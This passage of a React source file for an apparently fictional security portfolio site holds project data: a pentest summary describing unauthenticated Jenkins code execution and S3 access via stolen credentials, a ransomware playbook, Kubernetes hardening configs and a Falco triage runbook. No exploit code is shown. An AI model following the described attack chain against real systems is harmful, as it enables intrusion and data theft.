    * Used credentials to enumerate S3 buckets and discovered a bucket containing sensitive customer data backups.
`,
        },
      ],
      operationalMats: {
        title: 'Penetration Test Report - Executive Summary',
        content: `**Finding:** Critical Risk - Unauthenticated Remote Code Execution on Jenkins Server\n\n**Summary:** A publicly accessible Jenkins automation server was discovered to have an improperly configured security setup. This allowed an unauthenticated attacker to execute arbitrary commands on the server, resulting in a complete system compromise. From this initial foothold, the attacker was able to pivot and access sensitive data stored in an AWS S3 bucket by exfiltrating credentials stored on the server.\n\n**Business Impact:** This vulnerability could lead to a significant data breach, reputational damage, and regulatory fines. An attacker could steal or destroy sensitive customer data, disrupt business operations by shutting down the CI/CD platform, or use the compromised server as a launchpad for further attacks into the internal network.\n\n**Recommendation:**\n1.  **Immediate:** Restrict network access to the Jenkins server to internal IP addresses only. If external access is required, place it behind a VPN or authentication proxy.\n2.  **Short-Term:** Upgrade Jenkins to the latest version and properly enable authentication and authorization.\n3.  **Long-Term:** Implement a secrets management solution like HashiCorp Vault instead of storing credentials on disk. Rotate the compromised AWS credentials immediately.`,
      },
    },

    {
      id: 'p18',
      category: 'Defensive Security',
      title: 'Security Incident Response Playbook',
      description:
        'Developed and table-topped a comprehensive incident response (IR) playbook for a ransomware attack scenario. This project follows the NIST IR framework (Preparation, Detection & Analysis, Containment, Eradication & Recovery, Post-Incident Activity) and provides actionable steps for the IR team to effectively respond to and recover from a major security incident.',
      strategicDocs: {
        title: 'Incident Response Policy',
        content: `**Purpose:** To establish the authority, roles, and responsibilities for the company's Incident Response (IR) program.\n\n**Policy Statement:** The company will maintain a dedicated Cyber Security Incident Response Team (CSIRT). All suspected security incidents must be reported immediately to the CSIRT. The CSIRT is authorized to take necessary actions to contain and eradicate threats, including disconnecting systems from the network.\n\n**Scope:** This policy applies to all employees, contractors, and systems owned or operated by the company.\n\n**Framework:** The IR program will adhere to the principles outlined in the National Institute of Standards and Technology (NIST) Special Publication 800-61, "Computer Security Incident Handling Guide".`,
      },
      technicalImpl: [
        {
          fileName: 'playbook-ransomware.md',
          language: 'markdown',
          code: `
# Playbook: Ransomware Outbreak

## 1. Detection & Analysis

* **Triggers:**
    * Alert from EDR/Antivirus for ransomware detection.
    * User reports of encrypted files or ransom notes.
    * Unusual file I/O activity detected by file integrity monitoring.
* **Initial Analysis (First 15 mins):**
    * Confirm the incident is a genuine ransomware attack.
    * Identify the infected machine(s).
    * Isolate a malware sample for analysis.
    * Determine the scope: single machine, a department, entire network?

## 2. Containment

* **Immediate Actions (Execute in Parallel):**
    * **Isolate Infected Hosts:** Disconnect the machine(s) from the network. (Prioritize this!)
    * **Disable Compromised Accounts:** If the entry vector is known (e.g., phishing email), disable the user's account immediately.
    * **Segment Network:** If the ransomware is spreading, work with the network team to implement emergency firewall rules to block lateral movement (e.g., block SMB traffic between workstations).
    * **Verify Backups:** Confirm that backups are offline, isolated, and have not been affected. Test restoring a file from backup to a clean, isolated machine.

## 3. Eradication & Recovery

* **Eradication:**
    * Identify the specific ransomware variant. Check resources like "No More Ransom" for decryptors. (Assume no decryptor is available).
    * Wipe and reimage all affected machines from a known-good gold image. **Do not simply run antivirus.**
    * Identify and patch the root cause vulnerability (e.g., unpatched VPN, phishing).
* **Recovery:**
    * Restore user data from the most recent clean backup.
    * Reset passwords for all users and service accounts in the affected environment.
    * Monitor closely for any signs of reinfection.

## 4. Post-Incident Activity

* **Lessons Learned:** Conduct a post-mortem meeting within two weeks. What went well? What didn't?
* **Reporting:** Create a detailed incident report for management.
* **Improvements:** Update playbooks, tools, and configurations based on lessons learned.
`,
        },
      ],
      operationalMats: {
        title: 'Tabletop Exercise Scenario',
        content: `**Scenario:** It's Monday at 10:00 AM. A user in the finance department calls the help desk reporting that all their files have a ".lockbit" extension and they can't open them. A file on their desktop named "RESTORE-MY-FILES.txt" contains a ransom demand.\n\n**Inject 1 (10:15 AM):** The EDR platform begins alerting on hundreds of workstations, also showing signs of LockBit ransomware activity. The alerts indicate the process is spreading via SMB.\n\n**Inject 2 (11:00 AM):** The network team reports that domain controllers are showing unusually high CPU usage and are becoming unresponsive.\n\n**Questions for the Team:**\n1.  Who is the incident commander?\n2.  What are your first three actions in the first 15 minutes?\n3.  How do you decide what to disconnect from the network?\n4.  How do you communicate with employees when email and other systems may be down?\n5.  How do you determine if our backups are safe?\n6.  Do we pay the ransom? Who makes that decision?`,
      },
    },
    {
      id: 'p23',
      category: 'Cloud & Application Security',
      title: 'Kubernetes Security Hardening',
      description:
        'Implemented a multi-layered security strategy to harden a production EKS cluster. This project involved enforcing least-privilege with RBAC, restricting pod capabilities with Pod Security Standards, isolating network traffic with Cilium Network Policies, and performing runtime threat detection with Falco.',
      strategicDocs: {
        title: 'Kubernetes Security Policy',
        content: `**Purpose:** To define the minimum security requirements for all workloads deployed on the company's Kubernetes platforms.\n\n**Policy Statements:**\n1.  **Least Privilege:** All pods must run with a non-root user. \`allowPrivilegeEscalation\` must be set to \`false\`.\n2.  **Immutable Filesystem:** Pods should have a read-only root filesystem where possible.\n3.  **Network Isolation:** All namespaces must have a default-deny network policy. All allowed traffic must be explicitly defined.\n4.  **Image Provenance:** Only container images from the trusted company registry are allowed to run in the cluster.\n5.  **Runtime Monitoring:** All nodes in the cluster must have a runtime security agent installed.`,
      },
      technicalImpl: [
        {
          fileName: 'pod-security-standard.yaml',
          language: 'yaml',
          code: `
# This policy is applied at the namespace level to enforce the 'Restricted' Pod Security Standard.
# This prevents pods from running as root, gaining extra privileges, and more.
apiVersion: v1
kind: Namespace
metadata:
  name: secure-app
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
`,
        },
        {
          fileName: 'network-policy.yaml',
          language: 'yaml',
          code: `
# This CiliumNetworkPolicy provides a strong default-deny stance for a namespace
# and then allows specific traffic flows required by the application.
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "api-access-policy"
  namespace: secure-app
spec:
  endpointSelector:
    matchLabels:
      app: my-api
  
  # Default deny all ingress and egress
  ingress: []
  egress: []

---
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "allow-frontend-to-api"
  namespace: secure-app
spec:
  endpointSelector:
    matchLabels:
      app: my-api
  ingress:
    - fromEndpoints:
        - matchLabels:
            app: my-frontend
      toPorts:
        - ports:
            - port: "8080"
              protocol: TCP

---
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "allow-api-to-db"
  namespace: secure-app
spec:
  endpointSelector:
    matchLabels:
      app: my-api
  egress:
    - toEndpoints:
        - matchLabels:
            app: my-database
      toPorts:
        - ports:
            - port: "5432"
              protocol: TCP
    - toEndpoints: # Allow DNS
        - matchLabels:
            "k8s:io.kubernetes.pod.namespace": kube-system
            "k8s:k8s-app": kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP
          rules:
            dns:
              - matchPattern: "*"
`,
        },
      ],
      operationalMats: {
        title: 'Alert Triage Runbook: Falco - Terminal Shell in Container',
        content: `**Alert:** \`Notice: A shell was spawned in a container (user=root container=... shell=bash ...)\`\n\n**Severity:** High\n\n**Description:** An interactive shell was started inside a running container. This is highly unusual for production workloads and could indicate a compromise.\n\n**Triage Steps (First 5 mins):**\n1.  **Identify the Pod:** Extract the pod name, namespace, and container ID from the Falco alert.\n2.  **Check Pod's Purpose:** What application is this? Is there any legitimate reason a shell would be needed? (e.g., a debug container). For most production applications, the answer is NO.\n3.  **Review Recent Activity:** Check Kubernetes audit logs. Was the shell started via \`kubectl exec\`? If so, who executed the command? If not, it suggests the shell was spawned from a process inside the container, which is more suspicious (e.g., from a web shell exploit).\n\n**Containment Actions:**\n1.  **Cordon the Node:** Taint the node where the pod is running with \`NoSchedule\` to prevent new pods from being scheduled there.\n2.  **Isolate the Pod:** Apply a network policy that denies all egress traffic from the specific pod to prevent an attacker from exfiltrating data or moving laterally.\n3.  **Snapshot and Terminate:** If compromise is suspected, take a snapshot of the container's filesystem for forensics (\`docker commit\`) and then terminate the pod. Kubernetes will reschedule a clean version of the pod on a different node.`,
      },
    },
  ],
}


const HomeIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Home"
  >
    <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
    <polyline points="9 22 9 12 15 12 15 22"></polyline>
  </svg>
)

const FolderIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Project folder"
  >
    <path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"></path>
  </svg>
)

const FileTextIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Overview document"
  >
    <path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"></path>
    <polyline points="14 2 14 8 20 8"></polyline>
    <line x1="16" y1="13" x2="8" y2="13"></line>
    <line x1="16" y1="17" x2="8" y2="17"></line>
    <line x1="10" y1="9" x2="8" y2="9"></line>
  </svg>
)

const CodeIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Source code"
  >
    <polyline points="16 18 22 12 16 6"></polyline>
    <polyline points="8 6 2 12 8 18"></polyline>
  </svg>
)

const TerminalIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Terminal operations"
  >
    <polyline points="4 17 10 11 4 5"></polyline>
    <line x1="12" y1="19" x2="20" y2="19"></line>
  </svg>
)

const BookIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Strategic documentation"
  >
    <path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"></path>
  </svg>
)

const CopyIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="16"
    height="16"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Copy to clipboard"
  >
    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
  </svg>
)

const CheckIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="16"
    height="16"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Copied successfully"
  >
    <polyline points="20 6 9 17 4 12"></polyline>
  </svg>
)

const ChevronDownIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="16"
    height="16"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Expand"
  >
    <polyline points="6 9 12 15 18 9"></polyline>
  </svg>
)

const ChevronUpIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="16"
    height="16"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Collapse"
  >
    <polyline points="18 15 12 9 6 15"></polyline>
  </svg>
)

const ExpandAllIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="16"
    height="16"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Expand all code blocks"
  >
    <polyline points="7 13 12 18 17 13"></polyline>
    <polyline points="7 6 12 11 17 6"></polyline>
  </svg>
)

const CollapseAllIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="16"
    height="16"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    role="img"
    aria-label="Collapse all code blocks"
  >
    <polyline points="17 11 12 6 7 11"></polyline>
    <polyline points="17 18 12 13 7 18"></polyline>
  </svg>
)

interface CodeBlockProps extends TechnicalImplementation {
  isCollapsed?: boolean
  onToggle?: () => void
}

const CodeBlock: React.FC<CodeBlockProps> = ({ fileName, language, code, isCollapsed = false, onToggle }) => {
  const [copied, setCopied] = useState(false)

  const handleCopy = async () => {
    const textToCopy = code.trim()
    try {
      if (typeof navigator !== 'undefined' && navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(textToCopy)
      } else {
        throw new Error('Clipboard API not available')
      }
    } catch {
      const textArea = document.createElement('textarea')
      textArea.value = textToCopy
      document.body.appendChild(textArea)
      textArea.select()
      try {
        document.execCommand('copy')
      } finally {
        document.body.removeChild(textArea)
      }
    }
    setCopied(true)
    window.setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div className="bg-gray-800 rounded-lg overflow-hidden my-4 border border-gray-700 transition-all duration-200">
      <div className="flex justify-between items-center px-4 py-2 bg-gray-900 text-gray-400 text-xs">
        <button
          type="button"
          onClick={onToggle}
          className="flex items-center gap-2 font-mono hover:text-white transition-colors"
          aria-expanded={!isCollapsed}
        >
          <span className="transition-transform duration-200">
            {isCollapsed ? <ChevronDownIcon /> : <ChevronUpIcon />}
          </span>
          {fileName}
        </button>
        <button
          type="button"
          onClick={handleCopy}
          className="flex items-center gap-1.5 text-gray-400 hover:text-white transition-colors"
          aria-label={copied ? 'Copied to clipboard' : 'Copy code to clipboard'}
        >
          {copied ? <CheckIcon /> : <CopyIcon />}
          {copied ? 'Copied!' : 'Copy'}
        </button>
      </div>
      {!isCollapsed && (
        <div className="p-4 text-sm overflow-x-auto animate-fade-in">
          <pre><code className={`language-${language}`}>{code.trim()}</code></pre>
        </div>
      )}
    </div>
  )
}


interface SidebarProps {
  profile: PortfolioProfile
  projects: Project[]
  onSelectProject: (id: string | null) => void
  selectedProjectId: string | null
}

const CATEGORY_ICONS: Record<string, string> = {
  'Cloud & Infrastructure': '\u2601\uFE0F',
  'DevOps & CI/CD': '\u2699\uFE0F',
  'Software Development & QA': '\uD83D\uDCBB',
  'Offensive Security': '\uD83D\uDD34',
  'Defensive Security': '\uD83D\uDEE1\uFE0F',
  'Cloud & Application Security': '\uD83D\uDD12',
}

const Sidebar: React.FC<SidebarProps> = ({ profile, projects, onSelectProject, selectedProjectId }) => {
  const groupedProjects = useMemo(() => {
    return projects.reduce<Record<string, Project[]>>((acc, project) => {
      if (!acc[project.category]) {
        acc[project.category] = []
      }
      acc[project.category].push(project)
      return acc
    }, {})
  }, [projects])

  return (
    <aside className="w-80 bg-gray-900 text-white p-6 fixed h-full overflow-y-auto border-r border-gray-800 hidden md:block" role="navigation" aria-label="Portfolio sidebar">
      <div className="flex flex-col items-center text-center pb-6 border-b border-gray-700">
        <div className="w-24 h-24 rounded-full bg-gradient-to-tr from-sky-500 to-indigo-600 flex items-center justify-center text-4xl font-bold mb-4">
          {profile.name.charAt(0)}
        </div>
        <h1 className="text-xl font-bold">{profile.name}</h1>
        <p className="text-sm text-gray-400">{profile.title}</p>
      </div>
      <nav className="mt-6" aria-label="Project navigation">
        <ul>
          <li>
            <button
              type="button"
              onClick={() => onSelectProject(null)}
              className={`flex items-center w-full text-left py-2 px-3 rounded-md hover:bg-gray-700 transition-all duration-200 ${!selectedProjectId ? 'bg-sky-600 shadow-lg shadow-sky-600/30' : ''}`}
            >
              <HomeIcon />
              <span className="ml-3">Portfolio Home</span>
            </button>
          </li>
        </ul>
        <div className="mt-6">
          {Object.keys(groupedProjects).map(category => (
            <div key={category} className="mb-6">
              <h2 className="text-xs font-semibold text-gray-400 uppercase tracking-wider px-3 mb-2 flex items-center gap-2">
                <span>{CATEGORY_ICONS[category] || '\uD83D\uDCC1'}</span>
                {category}
              </h2>
              <ul>
                {groupedProjects[category].map(project => (
                  <li key={project.id}>
                    <button
                      type="button"
                      onClick={() => onSelectProject(project.id)}
                      className={`flex items-center w-full text-left py-2 px-3 rounded-md text-sm transition-all duration-200 ${
                        selectedProjectId === project.id
                          ? 'bg-gray-700 font-semibold text-sky-300 shadow-inner'
                          : 'hover:bg-gray-700/60 hover:translate-x-1'
                      }`}
                    >
                      <FolderIcon />
                      <span className="ml-3 truncate">{project.title}</span>
                    </button>
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>
      </nav>
    </aside>
  )
}

interface ProjectDetailProps {
  project: Project
}

const ProjectDetail: React.FC<ProjectDetailProps> = ({ project }) => {
  const [activeTab, setActiveTab] = useState<'overview' | 'technical' | 'operational' | 'strategic'>('overview')
  const [collapsedBlocks, setCollapsedBlocks] = useState<Set<string>>(new Set())

  useEffect(() => {
    setActiveTab('overview')
    setCollapsedBlocks(new Set())
  }, [project.id])

  const tabs = [
    { id: 'overview', label: 'Overview', icon: <FileTextIcon /> },
    { id: 'technical', label: 'Technical Implementation', icon: <CodeIcon /> },
    { id: 'operational', label: 'Operational Materials', icon: <TerminalIcon /> },
    { id: 'strategic', label: 'Strategic Documents', icon: <BookIcon /> },
  ] as const

  const toggleBlock = (fileName: string) => {
    setCollapsedBlocks(prev => {
      const next = new Set(prev)
      if (next.has(fileName)) {
        next.delete(fileName)
      } else {
        next.add(fileName)
      }
      return next
    })
  }

  const expandAll = () => setCollapsedBlocks(new Set())
  const collapseAll = () => setCollapsedBlocks(new Set(project.technicalImpl.map(i => i.fileName)))

  const renderContent = () => {
    switch (activeTab) {
      case 'overview':
        return <p className="text-gray-300 leading-relaxed whitespace-pre-wrap">{project.description}</p>
      case 'technical':
        return (
          <div>
            {project.technicalImpl.length > 1 && (
              <div className="flex items-center gap-3 mb-4">
                <button
                  type="button"
                  onClick={expandAll}
                  className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md border border-sky-500/30 bg-sky-500/10 text-sky-300 hover:bg-sky-500/20 hover:border-sky-400/50 transition-colors"
                  aria-label="Expand all code blocks"
                >
                  <ExpandAllIcon />
                  Expand All
                </button>
                <button
                  type="button"
                  onClick={collapseAll}
                  className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md border border-gray-600 bg-gray-700/50 text-gray-300 hover:bg-gray-700 hover:border-gray-500 transition-colors"
                  aria-label="Collapse all code blocks"
                >
                  <CollapseAllIcon />
                  Collapse All
                </button>
                <span className="text-xs text-gray-500">{project.technicalImpl.length} file{project.technicalImpl.length !== 1 ? 's' : ''}</span>
              </div>
            )}
            {project.technicalImpl.map(impl => (
              <CodeBlock
                key={impl.fileName}
                {...impl}
                isCollapsed={collapsedBlocks.has(impl.fileName)}
                onToggle={() => toggleBlock(impl.fileName)}
              />
            ))}
          </div>
        )
      case 'operational':
        return (
          <div className="prose prose-invert prose-sm max-w-none bg-gray-800 border border-gray-700 p-6 rounded-lg">
            <h3 className="text-sky-400">{project.operationalMats.title}</h3>
            <pre className="whitespace-pre-wrap font-sans text-gray-300">{project.operationalMats.content}</pre>
          </div>
        )
      case 'strategic':
        return (
          <div className="prose prose-invert prose-sm max-w-none bg-gray-800 border border-gray-700 p-6 rounded-lg">
            <h3 className="text-sky-400">{project.strategicDocs.title}</h3>
            <pre className="whitespace-pre-wrap font-sans text-gray-300">{project.strategicDocs.content}</pre>
          </div>
        )
      default:
        return null
    }
  }

  return (
    <div className="p-6 sm:p-10">
      <h1 className="text-3xl sm:text-4xl font-bold text-white mb-2">{project.title}</h1>
      <p className="text-base text-sky-400 mb-8">{project.category}</p>

      <div className="border-b border-gray-700 mb-6">
        <nav className="-mb-px flex space-x-2 sm:space-x-4 overflow-x-auto" aria-label="Project detail tabs">
          {tabs.map(tab => (
            <button
              key={tab.id}
              type="button"
              onClick={() => setActiveTab(tab.id)}
              aria-selected={activeTab === tab.id}
              role="tab"
              className={`whitespace-nowrap flex items-center gap-2 py-3 px-1 sm:px-3 border-b-2 font-medium text-sm transition-all duration-200 ${
                activeTab === tab.id
                  ? 'border-sky-500 text-sky-400'
                  : 'border-transparent text-gray-400 hover:text-gray-200 hover:border-gray-500'
              }`}
            >
              <span className={activeTab === tab.id ? 'animate-icon-pulse' : ''}>
                {tab.icon}
              </span>
              {tab.label}
            </button>
          ))}
        </nav>
      </div>

      <div className="animate-fade-in">{renderContent()}</div>
    </div>
  )
}

interface WelcomeScreenProps {
  profile: PortfolioProfile
  projects: Project[]
}

const WelcomeScreen: React.FC<WelcomeScreenProps> = ({ profile, projects }) => (
  <div className="p-6 sm:p-10 flex items-center justify-center h-full">
    <div className="text-center max-w-3xl">
      <div className="w-32 h-32 rounded-full bg-gradient-to-tr from-sky-500 to-indigo-600 flex items-center justify-center text-6xl font-bold mb-6 mx-auto">
        {profile.name.charAt(0)}
      </div>
      <h1 className="text-4xl sm:text-5xl font-bold text-white mb-4">Welcome to the Portfolio of {profile.name}</h1>
      <p className="text-lg text-gray-400 mb-8">{profile.summary}</p>
      <div className="bg-gray-800/50 border border-gray-700 rounded-lg p-6">
        <h2 className="text-xl font-semibold text-white mb-4">Portfolio Overview</h2>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 text-left">
          <div className="flex items-center gap-4">
            <div className="p-3 bg-sky-500/10 rounded-lg text-sky-400 animate-float"><FolderIcon /></div>
            <div>
              <p className="text-2xl font-bold text-white">{projects.length}</p>
              <p className="text-sm text-gray-400">Total Projects</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="p-3 bg-indigo-500/10 rounded-lg text-indigo-400 animate-float" style={{ animationDelay: '0.5s' }}><CodeIcon /></div>
            <div>
              <p className="text-2xl font-bold text-white">5+</p>
              <p className="text-sm text-gray-400">Core Disciplines</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="p-3 bg-emerald-500/10 rounded-lg text-emerald-400 animate-float" style={{ animationDelay: '1s' }}><TerminalIcon /></div>
            <div>
              <p className="text-2xl font-bold text-white">100+</p>
              <p className="text-sm text-gray-400">Enterprise Artifacts</p>
            </div>
          </div>
        </div>
      </div>
      <p className="mt-8 text-gray-500">Select a project from the sidebar to view its details.</p>
    </div>
  </div>
)

export const EnterprisePortfolio: React.FC = () => {
  const [selectedProjectId, setSelectedProjectId] = useState<string | null>(null)
  const [isSidebarOpen, setIsSidebarOpen] = useState(false)

  const selectedProject = useMemo(
    () => portfolioData.projects.find(project => project.id === selectedProjectId) ?? null,
    [selectedProjectId],
  )

  const handleSelectProject = (id: string | null) => {
    setSelectedProjectId(id)
    setIsSidebarOpen(false)
  }

  const MobileSidebar: React.FC = () => {
    const groupedProjects = useMemo(() => {
      return portfolioData.projects.reduce<Record<string, Project[]>>((acc, project) => {
        if (!acc[project.category]) {
          acc[project.category] = []
        }
        acc[project.category].push(project)
        return acc
      }, {})
    }, [portfolioData.projects])

    return (
      <div className={`fixed inset-0 z-40 md:hidden transition-transform transform ${isSidebarOpen ? 'translate-x-0' : '-translate-x-full'}`}>
        <div className="fixed inset-0 bg-black/60" onClick={() => setIsSidebarOpen(false)}></div>
        <div className="relative w-80 max-w-[calc(100%-3rem)] bg-gray-900 text-white p-6 h-full overflow-y-auto border-r border-gray-800">
          <div className="flex flex-col items-center text-center pb-6 border-b border-gray-700">
            <div className="w-24 h-24 rounded-full bg-gradient-to-tr from-sky-500 to-indigo-600 flex items-center justify-center text-4xl font-bold mb-4">
              {portfolioData.profile.name.charAt(0)}
            </div>
            <h1 className="text-xl font-bold">{portfolioData.profile.name}</h1>
            <p className="text-sm text-gray-400">{portfolioData.profile.title}</p>
          </div>
          <nav className="mt-6">
            <ul>
              <li>
                <button
                  type="button"
                  onClick={() => handleSelectProject(null)}
                  className={`flex items-center w-full text-left py-2 px-3 rounded-md hover:bg-gray-700 transition-colors ${!selectedProjectId ? 'bg-sky-600' : ''}`}
                >
                  <HomeIcon />
                  <span className="ml-3">Portfolio Home</span>
                </button>
              </li>
            </ul>
            <div className="mt-6">
              {Object.keys(groupedProjects).map(category => (
                <div key={category} className="mb-6">
                  <h2 className="text-xs font-semibold text-gray-400 uppercase tracking-wider px-3 mb-2">{category}</h2>
                  <ul>
                    {groupedProjects[category].map(project => (
                      <li key={project.id}>
                        <button
                          type="button"
                          onClick={() => handleSelectProject(project.id)}
                          className={`flex items-center w-full text-left py-2 px-3 rounded-md text-sm hover:bg-gray-700 transition-colors ${selectedProjectId === project.id ? 'bg-gray-700 font-semibold' : ''}`}
                        >
                          <FolderIcon />
                          <span className="ml-3 truncate">{project.title}</span>
                        </button>
                      </li>
                    ))}
                  </ul>
                </div>
              ))}
            </div>
          </nav>
        </div>
      </div>
    )
  }

  return (
    <div className="bg-gray-900 min-h-screen font-sans text-white">
      <style>{`
        .prose pre { background-color: #1f2937 !important; padding: 1rem; border-radius: 0.5rem; }
        code[class*="language-"], pre[class*="language-"] { color: #d1d5db; }
        .token.comment, .token.prolog, .token.doctype, .token.cdata { color: #6b7280; }
        .token.punctuation { color: #9ca3af; }
        .token.property, .token.tag, .token.boolean, .token.number, .token.constant, .token.symbol, .token.deleted { color: #f08d49; }
        .token.selector, .token.attr-name, .token.string, .token.char, .token.builtin, .token.inserted { color: #a5d6ff; }
        .token.operator, .token.entity, .token.url, .language-css .token.string, .style .token.string { color: #67e8f9; }
        .token.atrule, .token.attr-value, .token.keyword { color: #d8b4fe; }
        .token.function, .token.class-name { color: #fde047; }
        .token.regex, .token.important, .token.variable { color: #fca5a5; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fade-in { animation: fadeIn 0.5s ease-out forwards; }
        @keyframes iconPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
        .animate-icon-pulse { animation: iconPulse 0.4s ease-out; }
        @keyframes floatBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); } }
        .animate-float { animation: floatBounce 3s ease-in-out infinite; }
      `}</style>

      <Sidebar
        profile={portfolioData.profile}
        projects={portfolioData.projects}
        onSelectProject={handleSelectProject}
        selectedProjectId={selectedProjectId}
      />

      <MobileSidebar />

      <main className="md:ml-80 h-screen overflow-y-auto bg-gray-950">
        <button
          type="button"
          className="md:hidden fixed top-4 left-4 z-50 p-2 rounded-md bg-gray-800/50 backdrop-blur-sm hover:bg-gray-700/70 transition-colors"
          onClick={() => setIsSidebarOpen(!isSidebarOpen)}
          aria-label="Toggle sidebar navigation"
          aria-expanded={isSidebarOpen}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            role="img"
            aria-hidden="true"
          >
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </button>
        {selectedProject ? (
          <ProjectDetail project={selectedProject} />
        ) : (
          <WelcomeScreen profile={portfolioData.profile} projects={portfolioData.projects} />
        )}
      </main>
    </div>
  )
}
